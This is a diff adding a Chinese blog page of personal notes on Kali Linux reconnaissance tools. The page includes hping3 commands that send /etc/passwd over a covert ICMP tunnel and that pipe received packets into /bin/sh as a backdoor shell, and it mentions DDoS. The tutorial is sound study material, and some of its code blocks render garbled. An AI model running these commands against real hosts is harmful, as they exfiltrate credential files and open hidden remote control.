@@ -1,0 +1,527 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><link rel="apple-touch-icon" href="/images/icons/apple-touch-icon.png?v=2.6.2" sizes="180x180"><link rel="mask-icon" href="/images/icons/stun-logo.svg?v=2.6.2" color="#54bcff"><meta name="msapplication-TileImage" content="/images/icons/favicon-144x144.png"><meta name="msapplication-TileColor" content="#000000"><meta name="baidu-site-verification" content="code-15zD58SrOe"><meta name="description" content="工具大全                           信息收集                           存活主机识别        arping：  类似于ping，也是用来探测存活的，不过使用的arp协议不是ICMP协议，所以只能探测内网不能碰公网 -t参数可以添加mac地址，来保证IP地址绑定到了指定的MAC地址上 还行吧，可能pin">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Kali从0到1">
+<meta property="og:url" content="http://jlan.darkflow.top/posts/8b8ae737.html">
+<meta property="og:site_name" content="Jlan&#39;s Little World">
+<meta property="og:description" content="工具大全                           信息收集                           存活主机识别        arping：  类似于ping，也是用来探测存活的，不过使用的arp协议不是ICMP协议，所以只能探测内网不能碰公网 -t参数可以添加mac地址，来保证IP地址绑定到了指定的MAC地址上 还行吧，可能pin">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-09-30T00:13:21.000Z">
+<meta property="article:modified_time" content="2022-09-30T19:02:32.907Z">
+<meta property="article:author" content="Jlan">
+<meta name="twitter:card" content="summary"><title>Kali从0到1 | Jlan's Little World</title><link ref="canonical" href="http://jlan.darkflow.top/posts/8b8ae737.html"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  assistSearch: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
+  header: {"enable":true,"showOnPost":true,"scrollDownIcon":true},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"carbon","highlight":"dark","wordWrap":true},
+  reward: false,
+  fancybox: false,
+  zoomImage: {"gapAside":"20px"},
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: {"avoidBanner":false},
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"复制","copySuccess":"复制成功","copyError":"复制失败"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.0.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">标签</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/links/"><span class="header-nav-menu-item__icon"><i class="fas fa-user-friends"></i></span><span class="header-nav-menu-item__text">友链</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">搜索</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">Jlan's Little World</div><div class="header-banner-info__subtitle">欢迎来学习知识</div></div><div class="header-banner-arrow"><div class="header-banner-arrow__icon"><i class="fas fa-angle-down"></i></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">Kali从0到1</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2022-09-30</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2022-10-01</span></span><span class="post-meta-item post-meta-item--visitors leancloud_visitors" id="/posts/8b8ae737.html" data-flag-title="Kali从0到1"><span class="post-meta-item__icon"><i class="fas fa-eye"></i></span><span class="post-meta-item__info">阅读次数</span><span class="post-meta-item__value leancloud-visitors-count"></span></span><span class="post-meta-item post-meta-item--visitors"><span class="post-meta-item__icon"><i class="fas fa-eye"></i></span><span class="post-meta-item__info">阅读次数</span><span class="post-meta-item__value" id="busuanzi_value_page_pv"></span></span></div></header><div class="post-body">
+        <h1 id="工具大全"   >
+          <a href="#工具大全" class="heading-link"><i class="fas fa-link"></i></a><a href="#工具大全" class="headerlink" title="工具大全"></a>工具大全</h1>
+      
+        <h2 id="信息收集"   >
+          <a href="#信息收集" class="heading-link"><i class="fas fa-link"></i></a><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2>
+      
+        <h3 id="存活主机识别"   >
+          <a href="#存活主机识别" class="heading-link"><i class="fas fa-link"></i></a><a href="#存活主机识别" class="headerlink" title="存活主机识别"></a>存活主机识别</h3>
+      <ul>
+<li><p><strong>arping</strong>：</p>
+<ul>
+<li>类似于ping，也是用来探测存活的，不过使用的arp协议不是ICMP协议，所以只能探测内网不能碰公网</li>
+<li>-t参数可以添加mac地址，来保证IP地址绑定到了指定的MAC地址上</li>
+<li>还行吧，可能ping不管用的时候可以用，哦还可以用来捞mac地址</li>
+</ul>
+</li>
+<li><p><strong>fping</strong>：</p>
+<ul>
+<li><p>ping的加强版，fping可以在命令行中指定要ping的主机范围</p>
+</li>
+<li><p>与ping要等待某一主机连接超时或发回反馈信息不同，fping给一个主机发送完数据包后，马上给下一个主机发送数据包，实现多主机同时ping。如果某一主机ping通，则此主机将被打上标记，并从等待列表中移除，如果没ping通，说明主机无法到达，主机仍然留在等待列表中，等待后续操作。</p>
+</li>
+<li><p>```shell<br>fping IP1 IP2 IP3 …<br>fping -f filename<br>fping -g IP1 IP2<br>可以添加-a参数来只显示存活主机</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  - ping的升级版（自己写歌脚本貌似也差不多）</span><br><span class="line"></span><br><span class="line">- **hping3**：</span><br><span class="line"></span><br><span class="line">  - hping是安全审计、防火墙测试等工作的标配工具。hping优势在于能够定制数据包的各个部分，因此用户可以灵活对目标机进行细致地探测。</span><br><span class="line"></span><br><span class="line">  - 可以自己定制数据包来探测防火墙，也可以详细查看响应来判断拦截等内容，甚至可以用来伪造ICMP包来打DDOS</span><br><span class="line"></span><br><span class="line">  - ```</span><br><span class="line">    -a 指定包的请求IP，可以指定为目标来让自己反复ping自己，不过这样的话自己也就收不到响应数据了</span><br><span class="line">    -p 指定端口</span><br><span class="line">    -I 指定网卡</span><br><span class="line">    -c 指定发包次数</span><br></pre></td></tr></table></div></figure></li>
+<li><p><strong>文件传输</strong></p>
+<ul>
+<li><p>Hping3支持通过TCP/UDP/ICMP等包来进行文件传输。相当于借助TCP/UDP/ICMP包建立隐秘隧道通讯。实现方式是开启监听端口，对检测到的签名（签名为用户指定的字符串）的内容进行相应的解析。在接收端开启服务：</p>
+</li>
+<li><p>```shell<br>hping3 源IP –listen signature –safe  –icmp</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 监听ICMP包中的签名，根据签名解析出文件内容。</span><br><span class="line"></span><br><span class="line">- 在发送端使用签名打包的ICMP包发送文件：</span><br><span class="line"></span><br><span class="line">- ```shell</span><br><span class="line">  hping3 目标IP --icmp -d 100 --sign signature --file /etc/passwd</span><br></pre></td></tr></table></div></figure></li>
+<li><p>将<code>/etc/passwd</code>密码文件通过ICMP包传给目标主机。发送包大小为100字节（-d 100），发送签名为signature(-sign signature)。</p>
+</li>
+</ul>
+</li>
+<li><p><strong>反弹shell功能</strong></p>
+<ul>
+<li><p>如果Hping3能够在远程主机上启动，那么可以作为木马程序启动监听端口，并在建立连接后打开shell通信。与netcat的后门功能类似。</p>
+</li>
+<li><p>示例：本地打开53号UDP端口（DNS解析服务）监听来自192.168.10.66主机的包含签名为signature的数据包，并将收到的数据调用/bin/sh执行。</p>
+</li>
+<li><p>在木马启动端：</p>
+</li>
+<li><p>```<br>hping3 192.168.10.66–listen signature –safe –udp -p 53 | /bin/sh</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 在远程控制端：</span><br><span class="line"></span><br><span class="line">- ```</span><br><span class="line">  echo ls &gt;test.cmd hping3 192.168.10.44 -p53 -d 100 --udp --sign siganature --file ./test.cmd</span><br></pre></td></tr></table></div></figure></li>
+<li><p>将包含ls命令的文件加上签名signature发送到192.168.10.44主机的53号UDP端口，包数据长度为100字节。</p>
+</li>
+<li><p>当然这里只是简单的演示程序，真实的场景，控制端可以利益shell执行很多的高级复杂的操作。</p>
+</li>
+</ul>
+</li>
+<li><p>好高级的说，可以自定义的部分也很多，也有一些有趣的应用，可冲</p>
+</li>
+</ul>
+</li>
+<li><p><strong>masscan</strong>：</p>
+<ul>
+<li><p>又一个扫描工具，给个例子就过，好快啊</p>
+</li>
+<li><p>```<br>masscan -p80,8080-8100 10.0.0.0/8<br>（扫描10.x.x.x子网，扫描端口80和8000-8100范围的端口段）<br>可使用–echo把当前配置输出到文件，-c使用文件<br>–source-ip 指定源IP<br>–excludefile 文件 指定网段忽略<br>–max-rate 100000 最高发包速率<br>–banners 获取banner信息，支持少量的协议</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  - md你快有个卵子用，扫不出来端口存活信息啊</span><br><span class="line"></span><br><span class="line">- **thcping6**：</span><br><span class="line"></span><br><span class="line">  - 针对IPV6的发包工具，隶属于atk6这个这个工具包下，官方描述是sends a hand crafted ping6 packet，就是手动构造一个ping6的数据包</span><br><span class="line">  - 学了IPV6再来</span><br><span class="line"></span><br><span class="line">### 路由分析</span><br><span class="line"></span><br><span class="line">- **netdiscover**：</span><br><span class="line">  </span><br><span class="line">  - 二层发现工具，拥有主动和被动发现两种方式，通过ARP路由表探测</span><br><span class="line">  - 最简单的就是直接输入netdiscover之后就是运行它的默认配置然后扫描局域网中所有的机器</span><br><span class="line">  - 也可以直接输入网卡让他自己跑两层</span><br><span class="line">  - 每天一个被打电话小技巧</span><br><span class="line">  </span><br><span class="line">- **netmask**：</span><br><span class="line"></span><br><span class="line">  - netmaks可以在 IP范围、子网掩码、cidr、cisco等格式中互相转换，并且提供了IP地址的点分十进制、16进制、8进制、2进制之间的互相转换</span><br><span class="line"></span><br><span class="line">  - ```</span><br><span class="line">    Usage: netmask spec [spec ...]</span><br><span class="line">      -h, --help                    Print a summary of the options</span><br><span class="line">      -v, --version                 Print the version number</span><br><span class="line">      -d, --debug                   Print status/progress information</span><br><span class="line">      -s, --standard                Output address/netmask pairs</span><br><span class="line">      -c, --cidr                    Output CIDR format address lists</span><br><span class="line">      -i, --cisco                   Output Cisco style address lists</span><br><span class="line">      -r, --range                   Output ip address ranges</span><br><span class="line">      -x, --hex                     Output address/netmask pairs in hex</span><br><span class="line">      -o, --octal                   Output address/netmask pairs in octal</span><br><span class="line">      -b, --binary                  Output address/netmask pairs in binary</span><br><span class="line">      -n, --nodns                   Disable DNS lookups for addresses</span><br><span class="line">      -f, --files                   Treat arguments as input files</span><br><span class="line">    Definitions:</span><br><span class="line">      a spec can be any of:</span><br><span class="line">        address</span><br><span class="line">        address:address</span><br><span class="line">        address:+address</span><br><span class="line">        address/mask</span><br><span class="line">      an address can be any of:</span><br><span class="line">        N           decimal number</span><br><span class="line">        0N          octal number</span><br><span class="line">        0xN         hex number</span><br><span class="line">        N.N.N.N     dotted quad</span><br><span class="line">        hostname    dns domain name</span><br><span class="line">      a mask is the number of bits set to one from the left</span><br></pre></td></tr></table></div></figure></li>
+<li><p>这个看官方文档吧</p>
+</li>
+</ul>
+</li>
+</ul>
+
+        <h3 id="情报分析"   >
+          <a href="#情报分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#情报分析" class="headerlink" title="情报分析"></a>情报分析</h3>
+      <ul>
+<li><p><strong>spiderfoot</strong>：</p>
+<ul>
+<li>一个可以自动进行大量查询的工具</li>
+<li>启动需要指定好监听的IP和端口，然后浏览器直接访问就行啦</li>
+<li>好用的耶，一些资产搜寻不用手动做了，而且还可以没事搜搜自己来保护自己</li>
+</ul>
+</li>
+<li><p><strong>theHarvester</strong>：</p>
+<ul>
+<li><p>这个嘛就是一个手动的搜索工具啦，直接看官方文档就好</p>
+</li>
+<li><pre><code>-d    --domain                    要搜索的公司名称或域名。
+-l    --limit                        限制搜索结果的数量，默认=500。
+-S    --start                        从结果编号 X 开始，默认 = 0。
+-g    --google-dork            使用 Google Dorks 进行 Google 搜索。
+-p    --proxies                    对请求使用代理，在 proxies.yaml 中输入代理
+-s    --shodan                    使用 Shodan 查询发现的主机。
+--screenshot                    对已解析的域进行截图，指定输出目录：--screenshot output_directory
+-v    --virtual-host        通过 DNS 解析验证主机名并搜索虚拟主机。
+-e    --dns-server            用于查找的 DNS 服务器。
+-f    --filename                将结果保存到 XML 和 JSON 文件。
+-b    --source                    指定搜索的引擎和数据源
+
+#theHarvester -d [url] -l 300 -b [搜索引擎名称]
+</code></pre>
+</li>
+<li><p>没上一个自动化的好用，不开心😒</p>
+</li>
+</ul>
+</li>
+</ul>
+
+        <h2 id="漏洞分析"   >
+          <a href="#漏洞分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2>
+      
+        <h2 id="Web程序"   >
+          <a href="#Web程序" class="heading-link"><i class="fas fa-link"></i></a><a href="#Web程序" class="headerlink" title="Web程序"></a>Web程序</h2>
+      
+        <h2 id="数据库评估软件"   >
+          <a href="#数据库评估软件" class="heading-link"><i class="fas fa-link"></i></a><a href="#数据库评估软件" class="headerlink" title="数据库评估软件"></a>数据库评估软件</h2>
+      
+        <h2 id="密码攻击"   >
+          <a href="#密码攻击" class="heading-link"><i class="fas fa-link"></i></a><a href="#密码攻击" class="headerlink" title="密码攻击"></a>密码攻击</h2>
+      
+        <h2 id="无线攻击"   >
+          <a href="#无线攻击" class="heading-link"><i class="fas fa-link"></i></a><a href="#无线攻击" class="headerlink" title="无线攻击"></a>无线攻击</h2>
+      <script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css"></div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ 本文结束，感谢您的阅读 ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">本文作者: </span><span class="copyright-author__value"><a href="http://jlan.darkflow.top">Jlan</a></span></div><div class="copyright-link"><span class="copyright-link__name">本文链接: </span><span class="copyright-link__value"><a href="http://jlan.darkflow.top/posts/8b8ae737.html">http://jlan.darkflow.top/posts/8b8ae737.html</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">版权声明: </span><span class="copyright-notice__value">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> 许可协议。转载请注明出处！</span></div></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/posts/c3fdf5d6.html"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">网络安全基础网络知识</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/posts/ae2834af.html"><span class="paginator-prev__text">msf从0到0</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div><div class="comments" id="comments"><div id="valine-container"></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">文章目录</span><span class="sidebar-nav-ov">站点概览</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E5%A4%A7%E5%85%A8"><span class="toc-number">1.</span> <span class="toc-text">
+          工具大全</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.1.</span> <span class="toc-text">
+          信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA%E8%AF%86%E5%88%AB"><span class="toc-number">1.1.1.</span> <span class="toc-text">
+          存活主机识别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%83%85%E6%8A%A5%E5%88%86%E6%9E%90"><span class="toc-number">1.1.2.</span> <span class="toc-text">
+          情报分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">
+          漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web%E7%A8%8B%E5%BA%8F"><span class="toc-number">1.3.</span> <span class="toc-text">
+          Web程序</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AF%84%E4%BC%B0%E8%BD%AF%E4%BB%B6"><span class="toc-number">1.4.</span> <span class="toc-text">
+          数据库评估软件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E6%94%BB%E5%87%BB"><span class="toc-number">1.5.</span> <span class="toc-text">
+          密码攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E7%BA%BF%E6%94%BB%E5%87%BB"><span class="toc-number">1.6.</span> <span class="toc-text">
+          无线攻击</span></a></li></ol></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/head.png" alt="avatar"></div><p class="sidebar-ov-author__text">生命不息，折腾不止！</p></div><div class="sidebar-ov-social"><a class="sidebar-ov-social-item" href="https://github.com/zhisenyu" target="_blank" rel="noopener" data-popover="Github" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-github"></i></span></a><a class="sidebar-ov-social-item" href="https://www.youtube.com/channel/UCarZXyGTzWssmNANey0TC3g" target="_blank" rel="noopener" data-popover="Youtube" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-youtube"></i></span></a><a class="sidebar-ov-social-item" href="z405454586" target="_blank" rel="noopener" data-popover="微信" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-weixin"></i></span></a><a class="sidebar-ov-social-item" href="tencent://message?uin=405454586" target="_blank" rel="noopener" data-popover="QQ" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-qq"></i></span></a></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">65</div><div class="sidebar-ov-state-item__name">归档</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">13</div><div class="sidebar-ov-state-item__name">标签</div></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已阅读了 </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2022</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>Jlan</span></div><div><span>由 <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> 强力驱动</span><span> v6.0.0</span><span class="footer__devider">|</span><span>主题 - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div><div class="busuanzi"><span class="busuanzi-siteuv"><span class="busuanzi-siteuv__icon"><i class="fas fa-user"></i></span><span class="busuanzi-siteuv__info">访问人数</span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_uv"></span></span><span class="busuanzi-sitepv"><span class="busuanzi-siteuv__icon"><i class="fas fa-eye"></i></span><span class="busuanzi-siteuv__info">浏览总量</span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_pv"></span></span></div><div>已经是Dest0g3的菜狗了</div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="搜索文章（支持多关键词，请用空格分隔）"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1.0.1/dist/canvas-nest.min.js" color="0,0,0" opacity="0.6" count="150" zIndex="-1"></script><script>function initSearch() {
+  var isXML = true;
+  var search_path = 'search.json';
+
+  if (!search_path) {
+    search_path = 'search.xml';
+  } else if (/json$/i.test(search_path)) {
+    isXML = false;
+  }
+
+  var path = '/' + search_path;
+  $.ajax({
+    url: path,
+    dataType: isXML ? 'xml' : 'json',
+    async: true,
+    success: function (res) {
+      var datas = isXML ? $('entry', res).map(function () {
+        // 将 XML 转为 JSON
+        return {
+          title: $('title', this).text(),
+          content: $('content', this).text(),
+          url: $('url', this).text()
+        };
+      }).get() : res;
+      var $input = $('.search-input input');
+      var $result = $('.search-results');
+      // 搜索对象（标题、内容）的权重，影响显示顺序
+      var WEIGHT = { title: 100, content: 1 };
+      var searchPost = function () {
+        var searchText = $input.val().toLowerCase().trim();
+        // 根据空白字符分隔关键字
+        var keywords = searchText.split(/[\s]+/);
+        // 搜索结果
+        var matchPosts = [];
+
+        // 有多个关键字时，将原文字整个保存下来
+        if (keywords.length > 1) {
+          keywords.push(searchText);
+        }
+        // 防止未输入字符时搜索
+        if (searchText.length > 0) {
+          datas.forEach(function (data) {
+            var isMatch  = false;
+            // 没有标题的文章使用预设的 i18n 变量代替
+            var title = (data.title && data.title.trim()) || '[ 文章无标题 ]';
+            var titleLower = title && title.toLowerCase();
+            // 删除 HTML 标签 和 所有空白字符
+            var content = data.content && data.content.replace(/<[^>]+>/g, '');
+            var contentLower = content && content.toLowerCase();
+            // 删除重复的 /
+            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
+            // 标题中匹配到的关键词
+            var titleHitSlice = [];
+            // 内容中匹配到的关键词
+            var contentHitSlice = [];
+
+            keywords.forEach(function (keyword) {
+              /**
+              * 获取匹配的关键词的索引
+              * @param {String} keyword 要匹配的关键字
+              * @param {String} text 原文字
+              * @param {Boolean} caseSensitive 是否区分大小写
+              * @param {Number} weight 匹配对象的权重。权重大的优先显示
+              * @return {Array}
+              */
+              function getIndexByword (word, text, caseSensitive, weight) {
+                if (!word || !text) {
+                  return [];
+                };
+
+                var startIndex = 0; // 每次匹配的开始索引
+                var index = -1;     // 匹配到的索引值
+                var result = [];    // 匹配结果
+
+                if (!caseSensitive) {
+                  word = word.toLowerCase();
+                  text = text.toLowerCase();
+                }
+
+                while((index = text.indexOf(word, startIndex)) !== -1) {
+                  var hasMatch = false;
+                  // 索引位置相同的关键词，保留长度较长的
+                  titleHitSlice.forEach(function (hit) {
+                    if (hit.index === index && hit.word.length < word.length) {
+                      hit.word = word;
+                      hasMatch = true;
+                    }
+                  });
+                  startIndex = index + word.length;
+                  !hasMatch && result.push({ index: index, word: word, weight: weight });
+                }
+                return result;
+              }
+              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
+              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
+            });
+
+            var hitTitle = titleHitSlice.length;
+            var hitContent = contentHitSlice.length;
+
+            if (hitTitle > 0 || hitContent > 0) {
+              isMatch = true;
+            }
+            if (isMatch) {
+              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
+                // 按照匹配文字的索引的递增顺序排序
+                hit.sort(function (left, right) {
+                  return left.index - right.index;
+                });
+              });
+              /**
+              * 给文本中匹配到的关键词添加标记，从而进行高亮显示
+              * @param {String} text 原文本
+              * @param {Array} hitSlice 匹配项的索引信息
+              * @param {Number} start 开始索引
+              * @param {Number} end 结束索引
+              * @return {String}
+              */
+              function highlightKeyword (text, hitSlice, start, end) {
+                if (!text || !hitSlice || !hitSlice.length) {
+                  return;
+                }
+
+                var result = '';
+                var startIndex = start;
+                var endIndex = end;
+                hitSlice.forEach(function (hit) {
+                  if (hit.index < startIndex) {
+                    return;
+                  }
+
+                  var hitWordEnd = hit.index + hit.word.length;
+                  result += text.slice(startIndex, hit.index);
+                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
+                  startIndex = hitWordEnd;
+                });
+                result += text.slice(startIndex, endIndex);
+                return result;
+              }
+
+              var postData = {};
+              // 文章总的搜索权重
+              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
+              // 标记匹配关键词后的标题
+              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
+              // 标记匹配关键词后的内容
+              var postContent;
+              // 显示内容的长度
+              var SHOW_WORD_LENGTH = 200;
+              // 命中关键词前的字符显示长度
+              var SHOW_WORD_FRONT_LENGTH = 20;
+              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;
+
+              // 截取匹配的第一个字符，前后共 200 个字符来显示
+              if (contentHitSlice.length > 0) {
+                var firstIndex = contentHitSlice[0].index;
+                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
+                var end = firstIndex + SHOW_WORD_END_LENGTH;
+                postContent = highlightKeyword(content, contentHitSlice, start, end);
